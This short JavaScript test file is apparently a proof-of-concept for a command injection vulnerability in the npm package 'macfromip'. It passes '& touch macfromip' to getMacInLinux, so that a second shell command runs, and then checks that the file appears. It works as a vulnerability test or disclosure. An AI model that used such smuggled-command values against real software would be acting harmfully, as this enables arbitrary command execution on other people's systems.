const a = require("macfromip");
a.getMacInLinux("& touch macfromip", function () {});

test("Command Injection in macfromip", (done) => {
  expect.assertions(2);
  const a = require("macfromip");
  const fs = require("fs");
  const path = "./macfromip";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a.getMacInLinux("& touch macfromip", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
